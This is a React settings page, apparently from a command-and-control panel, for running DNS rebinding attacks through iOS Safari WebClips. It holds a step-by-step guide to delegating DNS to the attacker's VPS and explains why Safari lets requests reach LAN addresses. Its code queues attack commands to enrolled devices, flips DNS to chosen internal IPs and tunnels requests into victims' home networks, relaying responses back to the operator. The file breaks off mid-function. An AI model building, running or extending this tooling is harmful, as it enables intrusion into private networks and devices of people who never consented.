import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { apiFetch, parseUTC } from '../api/client.js';
import { useAuth } from '../context/AuthContext.jsx';
import UserManagement from './UserManagement.jsx';

const RB_DOMAIN_KEY = 'wc_rebind_domain';
const RB_VPS_KEY    = 'wc_rebind_vps_ip';

// ── Design tokens ─────────────────────────────────────────────────────────────
const T = {
  bg:        '#07080f',
  surface:   '#0c0d1a',
  surface2:  '#10121f',
  surface3:  '#141728',
  border:    'rgba(255,255,255,0.05)',
  borderMd:  'rgba(255,255,255,0.09)',
  borderHi:  'rgba(59,130,246,0.32)',
  text:      '#c9d1e8',
  text2:     '#4e5a70',
  text3:     '#252d3e',
  accent:    '#3b82f6',
  accentBg:  'rgba(59,130,246,0.09)',
  green:     '#22c55e',
  greenBg:   'rgba(34,197,94,0.09)',
  amber:     '#f59e0b',
  amberBg:   'rgba(245,158,11,0.09)',
  red:       '#ef4444',
  redBg:     'rgba(239,68,68,0.09)',
  mono:      "ui-monospace,'Cascadia Code','Fira Code','JetBrains Mono',monospace",
  sans:      "-apple-system,BlinkMacSystemFont,'Inter',system-ui,sans-serif",
};

const btn = {
  primary:  { height: 30, padding: '0 12px', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', border: 'none', background: T.accent, color: '#fff' },
  ghost:    { height: 30, padding: '0 12px', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', background: 'transparent', border: `1px solid ${T.borderMd}`, color: T.text },
  danger:   { height: 30, padding: '0 12px', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', background: 'transparent', border: '1px solid rgba(239,68,68,0.3)', color: T.red },
  success:  { height: 30, padding: '0 12px', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', background: T.greenBg, border: '1px solid rgba(34,197,94,0.25)', color: T.green },
  amber:    { height: 30, padding: '0 12px', borderRadius: 6, fontSize: 12, fontWeight: 600, cursor: 'pointer', background: T.amberBg, border: '1px solid rgba(245,158,11,0.25)', color: T.amber },
};

const inputSt = {
  background: T.surface2, border: `1px solid ${T.borderMd}`, borderRadius: 6,
  padding: '7px 10px', fontSize: 13, color: T.text, outline: 'none',
  fontFamily: T.sans,
};

const inputFull = { ...inputSt, width: '100%', boxSizing: 'border-box' };

const monoInput = { ...inputSt, fontFamily: T.mono };
const monoInputFull = { ...monoInput, width: '100%', boxSizing: 'border-box' };

const card = {
  background: T.surface3, border: `1px solid ${T.borderMd}`,
  borderRadius: 8, padding: '16px 18px', marginBottom: 16,
};

const sectionTitle = { fontSize: 13, fontWeight: 600, color: T.text, marginBottom: 14 };
const sectionSub   = { fontSize: 12, color: T.text2, marginBottom: 12 };
const fieldLabel   = { fontSize: 11, fontWeight: 600, color: T.text2, marginBottom: 5, display: 'block' };
const groupHeader  = {
  fontSize: 10, fontWeight: 700, letterSpacing: '0.09em', textTransform: 'uppercase',
  color: T.text2, marginBottom: 10, marginTop: 24,
};
const divider = { border: 'none', borderTop: `1px solid ${T.border}`, margin: '16px 0' };

const codeBlock = {
  background: T.bg, border: `1px solid ${T.border}`, borderRadius: 6,
  padding: '8px 12px', fontFamily: T.mono, fontSize: 12, color: T.text,
  wordBreak: 'break-all',
};

// ── Capability card ───────────────────────────────────────────────────────────
function CapCard({ label, ok, note }) {
  const color = ok === true ? T.green : ok === false ? T.red : T.text2;
  const bg    = ok === true ? T.greenBg : ok === false ? T.redBg : T.surface2;
  const bdr   = ok === true ? 'rgba(34,197,94,0.2)' : ok === false ? 'rgba(239,68,68,0.2)' : T.borderMd;
  const icon  = ok === true ? '✓' : ok === false ? '✗' : '?';
  return (
    <div style={{ background: bg, border: `1px solid ${bdr}`, borderRadius: 7, padding: '10px 14px', display: 'flex', flexDirection: 'column', gap: 4 }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 7 }}>
        <span style={{ color, fontSize: 12, fontWeight: 700 }}>{icon}</span>
        <span style={{ fontSize: 12, fontWeight: 600, color: T.text }}>{label}</span>
      </div>
      {note && <div style={{ fontSize: 11, color: T.text2, lineHeight: 1.5 }}>{note}</div>}
    </div>
  );
}

const CHECKS_KEY  = 'wc_rb_steps';
const TOTAL_STEPS = 6;

function loadChecks() {
  try { return JSON.parse(localStorage.getItem(CHECKS_KEY) ?? '{}'); } catch { return {}; }
}
function saveChecks(c) {
  try { localStorage.setItem(CHECKS_KEY, JSON.stringify(c)); } catch {}
}

// ── Step bubble ───────────────────────────────────────────────────────────────
function StepBubble({ n, checked, onToggle }) {
  return (
    <motion.button
      onClick={onToggle}
      title={checked ? 'Mark as not done' : 'Mark as done'}
      whileTap={{ scale: 0.88 }}
      style={{
        width: 24, height: 24, borderRadius: 12, border: 'none', cursor: 'pointer',
        flexShrink: 0, display: 'flex', alignItems: 'center', justifyContent: 'center',
        background: checked ? T.green : T.accent,
        boxShadow: checked ? '0 0 0 3px rgba(34,197,94,0.2)' : '0 0 0 0px transparent',
        transition: 'background 0.22s ease, box-shadow 0.22s ease',
        position: 'relative', overflow: 'hidden',
      }}
    >
      <AnimatePresence mode="wait" initial={false}>
        <motion.span
          key={checked ? 'check' : 'num'}
          initial={{ opacity: 0, scale: 0.5, rotate: -20 }}
          animate={{ opacity: 1, scale: 1, rotate: 0 }}
          exit={{ opacity: 0, scale: 0.5, rotate: 20 }}
          transition={{ type: 'spring', stiffness: 400, damping: 22 }}
          style={{ fontSize: checked ? 12 : 10, fontWeight: 700, color: '#fff', lineHeight: 1, position: 'absolute' }}
        >
          {checked ? '✓' : n}
        </motion.span>
      </AnimatePresence>
    </motion.button>
  );
}

// ── Single step row ───────────────────────────────────────────────────────────
function Step({ n, title, children, checked, onToggle }) {
  return (
    <motion.div layout style={{ marginBottom: 18, opacity: checked ? 0.45 : 1, transition: 'opacity 0.3s ease' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 9, marginBottom: 7 }}>
        <StepBubble n={n} checked={checked} onToggle={onToggle} />
        <span style={{
          fontSize: 12, fontWeight: 600,
          color: checked ? T.text2 : T.text,
          textDecoration: checked ? 'line-through' : 'none',
          transition: 'color 0.25s, text-decoration 0.25s',
        }}>{title}</span>
        {checked && (
          <motion.span initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }}
            style={{ fontSize: 10, color: T.green, fontWeight: 700, marginLeft: 2 }}>done</motion.span>
        )}
      </div>
      {!checked && (
        <pre style={{
          margin: 0, ...codeBlock, lineHeight: 1.6, overflowX: 'auto',
          whiteSpace: 'pre-wrap',
        }}>{children}</pre>
      )}
    </motion.div>
  );
}

// ── Cert paste step ───────────────────────────────────────────────────────────
function CertStep({ n, checked, onToggle, onSaveSuccess }) {
  const [cert, setCert]         = useState('');
  const [key,  setKey]          = useState('');
  const [status, setStatus]     = useState(null);
  const [certPaths, setCertPaths] = useState(null);
  const [errMsg, setErrMsg]     = useState('');

  useEffect(() => {
    apiFetch('/api/settings/rebind-cert').then(d => {
      if (d.has_cert && d.has_key) setCertPaths({ cert: d.cert_path, key: d.key_path });
    }).catch(() => {});
  }, []);

  async function save() {
    setStatus('saving'); setErrMsg('');
    try {
      const res = await apiFetch('/api/settings/rebind-cert', { method: 'POST', body: JSON.stringify({ cert, key }) });
      setCertPaths({ cert: res.cert_path, key: res.key_path });
      setStatus('ok');
      onSaveSuccess?.();
    } catch (e) { setStatus('err'); setErrMsg(e.message); }
  }

  const canSave = cert.trim().startsWith('-----BEGIN') && key.trim().startsWith('-----BEGIN') && status !== 'saving';

  return (
    <motion.div layout style={{ marginBottom: 18, opacity: checked ? 0.45 : 1, transition: 'opacity 0.3s ease' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 9, marginBottom: 10 }}>
        <StepBubble n={n} checked={checked} onToggle={onToggle} />
        <span style={{
          fontSize: 12, fontWeight: 600,
          color: checked ? T.text2 : T.text,
          textDecoration: checked ? 'line-through' : 'none',
        }}>Install TLS certificates on the server</span>
        {checked && (
          <motion.span initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }}
            style={{ fontSize: 10, color: T.green, fontWeight: 700, marginLeft: 2 }}>done</motion.span>
        )}
      </div>

      {!checked && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          {certPaths && (
            <div style={{ ...codeBlock, color: T.green, border: '1px solid rgba(34,197,94,0.2)', background: T.greenBg }}>
              Saved: {certPaths.cert}
            </div>
          )}
          <div style={{ display: 'flex', gap: 10 }}>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 5 }}>
              <label style={fieldLabel}>Certificate chain (fullchain.pem)</label>
              <textarea
                value={cert}
                onChange={e => { setCert(e.target.value); setStatus(null); }}
                placeholder={"-----BEGIN CERTIFICATE-----\n...\n-----END CERTIFICATE-----"}
                rows={6}
                style={{
                  ...monoInputFull,
                  border: `1px solid ${status === 'err' && !cert ? T.red : T.borderMd}`,
                  resize: 'vertical', lineHeight: 1.5, padding: '8px 10px',
                }}
              />
            </div>
            <div style={{ flex: 1, display: 'flex', flexDirection: 'column', gap: 5 }}>
              <label style={fieldLabel}>Private key (privkey.pem)</label>
              <textarea
                value={key}
                onChange={e => { setKey(e.target.value); setStatus(null); }}
                placeholder={"-----BEGIN PRIVATE KEY-----\n...\n-----END PRIVATE KEY-----"}
                rows={6}
                style={{
                  ...monoInputFull,
                  border: `1px solid ${status === 'err' && !key ? T.red : T.borderMd}`,
                  resize: 'vertical', lineHeight: 1.5, padding: '8px 10px',
                }}
              />
            </div>
          </div>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <motion.button
              whileTap={{ scale: 0.96 }}
              onClick={save}
              disabled={!canSave}
              style={{
                ...btn.primary,
                background: status === 'ok' ? T.green : T.accent,
                opacity: canSave ? 1 : 0.4, cursor: canSave ? 'pointer' : 'default',
                transition: 'background 0.2s, opacity 0.2s',
              }}
            >
              {status === 'saving' ? 'Saving...' : status === 'ok' ? 'Saved' : 'Save to server'}
            </motion.button>
            {status === 'err' && <span style={{ fontSize: 12, color: T.red }}>{errMsg || 'Save failed'}</span>}
            {!cert && !key && <span style={{ fontSize: 12, color: T.text2 }}>Paste both PEM blocks above, then click Save.</span>}
          </div>
        </div>
      )}
    </motion.div>
  );
}

// ── Server control step ───────────────────────────────────────────────────────
function ServerControlStep({ n, checked, onToggle, domain, vpsIp, onServerStart }) {
  const [status, setStatus]   = useState(null);
  const [loading, setLoading] = useState(false);
  const [errMsg, setErrMsg]   = useState('');
  const pollRef = useRef(null);

  async function fetchStatus() {
    try { const s = await apiFetch('/api/settings/rebind-server/status'); setStatus(s); } catch {}
  }

  useEffect(() => {
    fetchStatus();
    pollRef.current = setInterval(fetchStatus, 4000);
    return () => clearInterval(pollRef.current);
  }, []);

  async function start() {
    setLoading(true); setErrMsg('');
    try {
      await apiFetch('/api/settings/rebind-server/start', { method: 'POST', body: JSON.stringify({ domain, vps_ip: vpsIp }) });
      await fetchStatus();
      onServerStart?.();
    } catch (e) { setErrMsg(e.message); }
    setLoading(false);
  }

  async function stop() {
    setLoading(true); setErrMsg('');
    try {
      await apiFetch('/api/settings/rebind-server/stop', { method: 'POST' });
      await fetchStatus();
    } catch (e) { setErrMsg(e.message); }
    setLoading(false);
  }

  const running  = status?.running ?? false;
  const canStart = domain && vpsIp && !loading;

  return (
    <motion.div layout style={{ marginBottom: 18, opacity: checked ? 0.45 : 1, transition: 'opacity 0.3s ease' }}>
      <div style={{ display: 'flex', alignItems: 'center', gap: 9, marginBottom: 10 }}>
        <StepBubble n={n} checked={checked} onToggle={onToggle} />
        <span style={{
          fontSize: 12, fontWeight: 600,
          color: checked ? T.text2 : T.text,
          textDecoration: checked ? 'line-through' : 'none',
        }}>Run the DNS rebinding server</span>
        {checked && (
          <motion.span initial={{ opacity: 0, x: -6 }} animate={{ opacity: 1, x: 0 }}
            style={{ fontSize: 10, color: T.green, fontWeight: 700, marginLeft: 2 }}>done</motion.span>
        )}
      </div>

      {!checked && (
        <div style={{ display: 'flex', flexDirection: 'column', gap: 9 }}>
          <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
            <motion.div layout style={{
              display: 'inline-flex', alignItems: 'center', gap: 6,
              padding: '4px 10px', borderRadius: 20, fontSize: 12, fontWeight: 600,
              background: running ? T.greenBg : T.redBg,
              border: `1px solid ${running ? 'rgba(34,197,94,0.2)' : 'rgba(239,68,68,0.2)'}`,
              color: running ? T.green : T.red,
            }}>
              <motion.span animate={{ opacity: running ? [1, 0.4, 1] : 1 }} transition={{ repeat: running ? Infinity : 0, duration: 1.4 }}>
                ●
              </motion.span>
              {status === null ? 'Checking...' : running ? `Running (PID ${status.pid})` : 'Stopped'}
            </motion.div>

            {!running ? (
              <motion.button whileTap={{ scale: 0.94 }} onClick={start} disabled={!canStart}
                style={{ ...btn.success, opacity: canStart ? 1 : 0.4, cursor: canStart ? 'pointer' : 'default' }}>
                {loading ? 'Starting...' : 'Start'}
              </motion.button>
            ) : (
              <motion.button whileTap={{ scale: 0.94 }} onClick={stop} disabled={loading}
                style={{ ...btn.danger }}>
                {loading ? 'Stopping...' : 'Stop'}
              </motion.button>
            )}
          </div>

          {!domain && <div style={{ fontSize: 12, color: T.amber }}>Configure and save a domain above first.</div>}
          {!vpsIp  && <div style={{ fontSize: 12, color: T.amber }}>Configure and save the VPS IP above first.</div>}
          {errMsg  && <div style={{ ...codeBlock, color: T.red, marginTop: 2 }}>{errMsg}</div>}

          {running && (
            <div style={{ ...codeBlock, lineHeight: 1.7 }}>
              DNS  -&gt; :53    (TTL=1, domain={domain}){'\n'}
              HTTP -&gt; :80    (rb-launch.html popup){'\n'}
              HTTPS-&gt; :8444  (ping check)
            </div>
          )}
        </div>
      )}
    </motion.div>
  );
}

// ── Setup Guide ───────────────────────────────────────────────────────────────
function SetupGuide({ domain, vpsIp }) {
  const [open, setOpen]     = useState(false);
  const [checks, setChecks] = useState(loadChecks);
  const d = domain || 'rb.yourserver.com';
  const parentDomain = d.split('.').length > 2 ? d.split('.').slice(1).join('.') : d;

  useEffect(() => { saveChecks(checks); }, [checks]);

  function toggle(n) {
    const k = String(n);
    setChecks(prev => ({ ...prev, [k]: !prev[k] }));
  }

  const doneCount = Object.keys(checks).filter(k => Number(k) >= 1 && Number(k) <= 6 && checks[k]).length;
  const allDone   = doneCount === TOTAL_STEPS;

  return (
    <div style={{
      background: T.surface3, borderRadius: 8,
      border: `1px solid ${allDone ? 'rgba(34,197,94,0.2)' : T.borderMd}`,
      overflow: 'hidden', transition: 'border-color 0.3s',
    }}>
      <button onClick={() => setOpen(o => !o)} style={{
        width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'space-between',
        padding: '12px 16px', background: 'none', border: 'none', cursor: 'pointer',
        color: T.text, fontSize: 12, fontWeight: 600, textAlign: 'left',
        fontFamily: T.sans,
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 9 }}>
          <span>Setup Guide - DNS Rebinding Server</span>
          <motion.div layout style={{
            padding: '2px 8px', borderRadius: 20, fontSize: 10, fontWeight: 700,
            background: allDone ? T.greenBg : doneCount > 0 ? T.accentBg : T.surface2,
            color: allDone ? T.green : doneCount > 0 ? T.accent : T.text2,
            border: `1px solid ${allDone ? 'rgba(34,197,94,0.2)' : doneCount > 0 ? 'rgba(59,130,246,0.2)' : T.border}`,
            transition: 'background 0.3s, color 0.3s',
          }}>
            {allDone ? 'Complete' : `${doneCount}/${TOTAL_STEPS}`}
          </motion.div>
        </div>
        <span style={{
          color: T.text2, fontSize: 16, lineHeight: 1, display: 'inline-block',
          transform: open ? 'rotate(90deg)' : 'none', transition: 'transform 0.15s ease',
        }}>›</span>
      </button>

      {open && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          style={{ borderTop: `1px solid ${T.border}`, background: T.surface2, padding: '16px 20px' }}
        >
          <div style={{ fontSize: 11, color: T.text2, marginBottom: 14 }}>
            Click the number bubble to mark a step as done.
          </div>

          <Step n={1} title="Set a dedicated rebind subdomain (NOT the C2 domain)" checked={!!checks['1']} onToggle={() => toggle(1)}>
            {`In Server Config above, the "Rebind domain" must be a SUBDOMAIN -- not the same\ndomain the WebClip is served from.\n\nWhy: the attack flips the DNS of this domain to an internal IP.\nIf you used the C2 domain (${parentDomain}), the C2 itself would break.\n\nCorrect value to enter:\n  ${d}\n\nThis subdomain is covered by the wildcard A record in step 3.`}
          </Step>

          <Step n={2} title={`NS delegation: ${d} -> VPS DNS server`} checked={!!checks['2']} onToggle={() => toggle(2)}>
            {`CRITICAL -- without this, DNS rebinding doesn't work.\n\nCloudflare is authoritative by default. For the VPS DNS server to control\nthe flip, you must delegate ${d} to the VPS.\n\nIn Cloudflare DNS, add these two records:\n\n  Type: NS\n  Name: ${d}\n  Value: ns1.${parentDomain}\n  TTL: 1 min\n  Proxy: DNS only (grey cloud)\n\n  Type: A\n  Name: ns1.${parentDomain}\n  Value: ${vpsIp || '<your-vps-ip>'}\n  TTL: 1 min\n  Proxy: DNS only (grey cloud)\n\nAlso open port 53 on the VPS firewall:\n  $ sudo ufw allow 53/tcp\n  $ sudo ufw allow 53/udp\n\nAfter this, queries for ${d} go directly to\nthe rebind server -- it can flip the answer to a LAN IP at will.`}
          </Step>

          <Step n={3} title={`Wildcard DNS A record: *.${parentDomain} -> VPS, TTL=1min`} checked={!!checks['3']} onToggle={() => toggle(3)}>
            {`In Cloudflare, verify this record exists (covers all other subdomains):\n\n  Type: A\n  Name: *.${parentDomain}\n  Value: ${vpsIp || '<your-vps-ip>'}\n  TTL: 1 min  (Cloudflare minimum)\n  Proxy: DNS only (grey cloud -- NOT orange)\n\nNote: ${d} is now delegated via NS (step 2).\nThe wildcard covers other subdomains like the C2 at ${parentDomain}.`}
          </Step>

          <Step n={4} title={`Wildcard TLS cert for *.${parentDomain}`} checked={!!checks['4']} onToggle={() => toggle(4)}>
            {`The rebind server needs HTTPS to respond to the prerequisite check.\nGet a wildcard cert via Let's Encrypt DNS-01 challenge:\n\n  $ certbot certonly --manual --preferred-challenges=dns \\\n    -d "*.${parentDomain}"\n\nCertbot will ask you to add a TXT record in Cloudflare:\n  Name:  _acme-challenge.${parentDomain}\n  Value: <the token certbot gives you>\n\nOnce validated, cert files are at:\n  /etc/letsencrypt/live/${parentDomain}/fullchain.pem\n  /etc/letsencrypt/live/${parentDomain}/privkey.pem\n\nPaste those in step 5 below.`}
          </Step>

          <CertStep
            n={5}
            checked={!!checks['5']}
            onToggle={() => toggle(5)}
            onSaveSuccess={() => setChecks(prev => ({ ...prev, '1': true, '2': true, '3': true, '4': true, '5': true }))}
          />

          <ServerControlStep
            n={6}
            checked={!!checks['6']}
            onToggle={() => toggle(6)}
            domain={d === 'rb.yourserver.com' ? '' : d}
            vpsIp={vpsIp}
            onServerStart={() => setChecks(prev => ({ ...prev, '6': true }))}
          />

          <div style={{
            marginTop: 8, padding: '12px 14px', borderRadius: 7,
            background: T.accentBg, border: `1px solid rgba(59,130,246,0.18)`,
          }}>
            <div style={{ fontSize: 10, fontWeight: 700, color: T.accent, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.08em' }}>
              Why it works on iOS Safari / WebClip
            </div>
            <div style={{ ...codeBlock, background: 'transparent', border: 'none', padding: 0, lineHeight: 1.7 }}>
              iOS Safari does NOT enforce Chrome's "Local Network Access" policy.{'\n'}
              Chrome blocks cross-origin requests to private IPs -- Safari does not.{'\n\n'}
              WebClip runs inside Safari's engine with the same privileges.{'\n'}
              When DNS re-resolves to 192.168.x.x, the browser sends the HTTP request{'\n'}
              to the internal device without any permission popup.{'\n\n'}
              Limitation: only HTTP targets (port 80) work cleanly.{'\n'}
              HTTPS targets fail TLS cert validation (cert is for your domain, not the LAN IP).{'\n'}
              The rb-launch.html popup trick bypasses mixed-content by running on HTTP origin.
            </div>
          </div>

          {doneCount > 0 && (
            <motion.button
              initial={{ opacity: 0 }} animate={{ opacity: 1 }}
              onClick={() => { saveChecks({}); setChecks({}); }}
              style={{
                background: 'none', border: 'none', cursor: 'pointer',
                fontSize: 11, color: T.text3, marginTop: 8,
                textDecoration: 'underline', padding: 0, fontFamily: T.sans,
              }}
            >Reset checklist</motion.button>
          )}
        </motion.div>
      )}
    </div>
  );
}

// ── Main Settings page ────────────────────────────────────────────────────────
export default function Settings() {
  const { role } = useAuth();
  const [devices, setDevices] = useState([]);
  const [domain, setDomain]           = useState(() => localStorage.getItem(RB_DOMAIN_KEY) ?? '');
  const [domainInput, setDomainInput] = useState(() => localStorage.getItem(RB_DOMAIN_KEY) ?? '');
  const [vpsIp, setVpsIp]             = useState(() => localStorage.getItem(RB_VPS_KEY) ?? '');
  const [vpsIpInput, setVpsIpInput]   = useState(() => localStorage.getItem(RB_VPS_KEY) ?? '');
  const [selectedDevice, setSelectedDevice] = useState('');
  const [running, setRunning]   = useState(false);
  const [result, setResult]     = useState(null);
  const [statusMsg, setStatusMsg] = useState('');
  const pollRef    = useRef(null);
  const sentAtRef  = useRef(null);

  const [launchTargetIP, setLaunchTargetIP]     = useState('');
  const [launchTargetPort, setLaunchTargetPort] = useState('80');
  const [launchPath, setLaunchPath]             = useState('/');
  const [launchRunning, setLaunchRunning]       = useState(false);
  const [launchResult, setLaunchResult]         = useState(null);
  const [launchStatusMsg, setLaunchStatusMsg]   = useState('');
  const [launchLiveStatus, setLaunchLiveStatus] = useState(null);
  const launchPollRef  = useRef(null);
  const launchSentAtRef = useRef(null);
  const launchTokenRef  = useRef(null);
  const [preflipState, setPreflipState] = useState('idle');
  const [preflipSecs, setPreflipSecs]   = useState(0);
  const preflipTimerRef = useRef(null);
  const preflipPollRef  = useRef(null);
  const PREFLIP_MAX_SECONDS = 120;

  const [tunnelPath, setTunnelPath]           = useState('/');
  const [tunnelLoading, setTunnelLoading]     = useState(false);
  const [tunnelResponse, setTunnelResponse]   = useState(null);
  const tunnelPollRef = useRef(null);

  const [cpCurrent, setCpCurrent] = useState('');
  const [cpNew, setCpNew]         = useState('');
  const [cpConfirm, setCpConfirm] = useState('');
  const [cpLoading, setCpLoading] = useState(false);
  const [cpError, setCpError]     = useState('');
  const [cpSuccess, setCpSuccess] = useState(false);

  useEffect(() => {
    const saved = (() => { try { return JSON.parse(localStorage.getItem('wc_pending_rb') || 'null'); } catch { return null; } })();
    if (saved && saved.token && Date.now() - saved.startTs < 5 * 60 * 1000) {
      launchTokenRef.current    = saved.token;
      launchSentAtRef.current   = saved.startTs;
      setLaunchRunning(true);
      setLaunchStatusMsg('Resumed attack - polling relay...');
      startLaunchPoll(saved.token);
    }
  }, []);

  function startLaunchPoll(token) {
    clearInterval(launchPollRef.current);
    let ticks = 0;
    launchPollRef.current = setInterval(async () => {
      ticks++;
      if (ticks > 120) {
        clearInterval(launchPollRef.current);
        setLaunchRunning(false);
        setLaunchStatusMsg('Timed out - no result received');
        setLaunchLiveStatus(null);
        localStorage.removeItem('wc_pending_rb');
        return;
      }
      try {
        const st = await apiFetch(`/api/rb/status/${token}`).catch(() => null);
        if (st?.status) setLaunchLiveStatus(st.status);
        const relay = await apiFetch(`/api/rb/result/${token}`);
        if (relay?.ready && relay?.result) {
          clearInterval(launchPollRef.current);
          setLaunchRunning(false);
          setLaunchStatusMsg('');
          setLaunchLiveStatus(null);
          setLaunchResult(relay.result);
          localStorage.removeItem('wc_pending_rb');
        }
      } catch {}
    }, 1500);
  }

  const [health, setHealth]           = useState(null);
  const [healthLoading, setHealthLoading] = useState(false);

  useEffect(() => {
    apiFetch('/api/devices/').then(d => {
      const all    = Array.isArray(d) ? d : (d.items ?? []);
      const now    = Date.now();
      const online = all.filter(dev => {
        const seen = dev.last_seen ? new Date(dev.last_seen + 'Z').getTime() : 0;
        return now - seen < 60_000;
      });
      const list = online.length > 0 ? online : all;
      setDevices(list);
      if (list.length > 0) setSelectedDevice(String(list[0].id));
    }).catch(() => {});
  }, []);

  async function fetchHealth(d, ip) {
    if (!d) return;
    setHealthLoading(true);
    try {
      const params = new URLSearchParams({ domain: d, vps_ip: ip || '' });
      const h = await apiFetch(`/api/settings/rebind-health?${params}`);
      setHealth(h);
    } catch {}
    setHealthLoading(false);
  }

  useEffect(() => { if (domain) fetchHealth(domain, vpsIp); }, []); // eslint-disable-line react-hooks/exhaustive-deps

  function saveConfig() {
    const d  = domainInput.trim();
    const ip = vpsIpInput.trim();
    localStorage.setItem(RB_DOMAIN_KEY, d);
    localStorage.setItem(RB_VPS_KEY, ip);
    setDomain(d);
    setVpsIp(ip);
    if (d) fetchHealth(d, ip);
  }

  async function runCheck() {
    if (!selectedDevice) return;
    setRunning(true);
    setResult(null);
    setStatusMsg('Sending command to device...');
    sentAtRef.current = Date.now();
    try {
      await apiFetch(`/api/devices/${selectedDevice}/commands`, { method: 'DELETE' }).catch(() => {});
      await apiFetch(`/api/devices/${selectedDevice}/commands`, {
        method: 'POST',
        body: JSON.stringify({ type: 'rebind_check', payload: { domain } }),
      });
    } catch (e) {
      setStatusMsg(`Failed to send: ${e.message}`);
      setRunning(false);
      return;
    }
    setStatusMsg('Waiting for device result...');
    const FRESH = 5 * 60 * 1000;
    let ticks = 0;
    pollRef.current = setInterval(async () => {
      ticks++;
      if (ticks > 30) {
        clearInterval(pollRef.current);
        setRunning(false);
        setStatusMsg('Timed out - device may be offline');
        return;
      }
      try {
        const evs = await apiFetch(`/api/devices/${selectedDevice}/latest-by-type`);
        const res = evs.find(e =>
          e.type === 'rebind_check_result' &&
          (parseUTC(e.timestamp)?.getTime() ?? 0) >= sentAtRef.current - FRESH
        );
        if (res) {
          clearInterval(pollRef.current);
          setRunning(false);
          setStatusMsg('');
          const raw  = res.data ?? res.data_json;
          const data = typeof raw === 'string' ? JSON.parse(raw) : raw;
          setResult(data);
        } else {
          const st = evs.find(e =>
            e.type === 'rebind_check_status' &&
            (parseUTC(e.timestamp)?.getTime() ?? 0) >= sentAtRef.current - FRESH
          );
          if (st) {
            const rawSd = st.data ?? st.data_json;
            const sd    = typeof rawSd === 'string' ? JSON.parse(rawSd) : rawSd;
            setStatusMsg(sd?.msg ?? 'Running...');
          }
        }
      } catch {}
    }, 3000);
  }

  useEffect(() => () => clearInterval(pollRef.current), []);
  useEffect(() => () => clearInterval(launchPollRef.current), []);
  useEffect(() => () => clearInterval(tunnelPollRef.current), []);

  async function browseTunnel() {
    const token = launchTokenRef.current;
    if (!token || tunnelLoading) return;
    setTunnelLoading(true);
    setTunnelResponse(null);
    try {
      const res = await apiFetch('/api/rb/tunnel/request', {
        method: 'POST',
        body: JSON.stringify({ token, url: tunnelPath || '/' }),
      });
      if (!res.ok) { setTunnelResponse({ ok: false, error: 'Failed to queue request' }); setTunnelLoading(false); return; }
      const reqId = res.req_id;
      let ticks = 0;
      clearInterval(tunnelPollRef.current);
      tunnelPollRef.current = setInterval(async () => {
        ticks++;
        if (ticks > 60) { clearInterval(tunnelPollRef.current); setTunnelLoading(false); setTunnelResponse({ ok: false, error: 'Timed out - no response from device' }); return; }
        try {
          const r = await apiFetch(`/api/rb/tunnel/result/${token}/${reqId}`);
          if (r.ready && r.result) {
            clearInterval(tunnelPollRef.current);
            setTunnelLoading(false);
            setTunnelResponse(r.result);
          }
        } catch {}
      }, 1500);
    } catch (e) {
      setTunnelResponse({ ok: false, error: e.message });
      setTunnelLoading(false);
    }
  }

  async function endTunnel() {
    const token = launchTokenRef.current;
    if (!token) return;
    await apiFetch('/api/rb/tunnel/end', { method: 'POST', body: JSON.stringify({ token }) }).catch(() => {});
    setLaunchResult(null);
    setTunnelResponse(null);
    launchTokenRef.current = null;
    localStorage.removeItem('wc_pending_rb');
  }

  async function stopAttack() {
    clearInterval(launchPollRef.current);
    setLaunchRunning(false);
    setLaunchStatusMsg('');
    setLaunchLiveStatus(null);
    const token = launchTokenRef.current;
    if (token) {
      await apiFetch('/api/rb/tunnel/end', { method: 'POST', body: JSON.stringify({ token }) }).catch(() => {});
    }
    localStorage.removeItem('wc_pending_rb');
    if (selectedDevice) {
      await apiFetch(`/api/devices/${selectedDevice}/commands`, { method: 'DELETE' }).catch(() => {});
    }
  }

  async function preFlip() {
    if (!domain || !launchTargetIP) return;
    clearInterval(preflipTimerRef.current);
    clearInterval(preflipPollRef.current);
    setPreflipState('priming');
    setPreflipSecs(0);
    await apiFetch(`/api/rb/flip?target=${encodeURIComponent(launchTargetIP)}`).catch(() => {});
    const startedAt = Date.now();
    preflipTimerRef.current = setInterval(() => {
      const elapsed = Math.floor((Date.now() - startedAt) / 1000);
      setPreflipSecs(elapsed);
      if (elapsed >= PREFLIP_MAX_SECONDS) {
        clearInterval(preflipTimerRef.current);
        clearInterval(preflipPollRef.current);
        apiFetch('/api/rb/unflip').catch(() => {});
        setPreflipState('ready');
      }
    }, 1000);
    preflipPollRef.current = setInterval(async () => {
      try {
        const st = await apiFetch('/api/rb/query-status');
        if (st?.proxy_updated) {
          clearInterval(preflipTimerRef.current);
          clearInterval(preflipPollRef.current);
          await apiFetch('/api/rb/unflip').catch(() => {});
          setPreflipState('ready');
        }
      } catch (_) {}
    }, 2500);
  }

  function cancelPreflip() {
    clearInterval(preflipTimerRef.current);
    clearInterval(preflipPollRef.current);
    setPreflipState('idle');
    setPreflipSecs(0);
    apiFetch('/api/rb/unflip').catch(() => {});
  }

  async function runLaunch() {
    if (!selectedDevice || !domain || !launchTargetIP) return;
    setLaunchRunning(true);
    setLaunchResult(null);
    setLaunchLiveStatus(null);
    setLaunchStatusMsg('Sending launch command...');
    launchSentAtRef.current = Date.now();
    const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
    launchTokenRef.current = token;
    localStorage.setItem('wc_pending_rb', JSON.stringify({ token, startTs: launchSentAtRef.current }));
